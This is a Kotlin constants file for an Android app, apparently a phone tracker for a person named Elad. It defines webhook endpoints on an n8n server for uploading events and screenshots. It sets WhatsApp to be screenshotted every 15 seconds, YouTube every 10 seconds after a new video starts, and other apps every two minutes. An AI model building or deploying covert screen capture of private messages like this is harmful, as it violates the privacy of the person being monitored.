package com.aautomations.eladtracker

// Central configuration constants for Elad phone tracker.
// All URLs, intervals, and app-specific settings live here.

object Constants {
    const val N8N_BASE = "https://n8n2.aautomations.business"
    const val UPLOAD_URL = "$N8N_BASE/webhook/phone-upload"
    const val SCREENSHOT_URL = "$N8N_BASE/webhook/phone-screenshot"
    const val POLL_URL = "$N8N_BASE/webhook/phone-poll"

    // How often to batch-upload events and poll for settings
    const val BATCH_INTERVAL_MS = 120_000L // 2 minutes

    // Screenshot cadence for regular apps
    const val SCREENSHOT_INTERVAL_MS = 120_000L // 2 min default

    // WhatsApp: take a screenshot every 15 seconds while foregrounded
    const val WHATSAPP_INTERVAL_MS = 15_000L

    // YouTube video follow-up: take a screenshot every 10 seconds after a new video starts
    const val VIDEO_FOLLOW_UP_MS = 10_000L

    // Apps that get higher-frequency screenshots (WhatsApp only — YouTube handled via MediaSession)
    val SPECIAL_APPS = setOf("com.whatsapp")

    const val PREFS_NAME = "tracker_prefs"
    const val PREF_SCREENSHOTS_ENABLED = "screenshots_enabled"
}
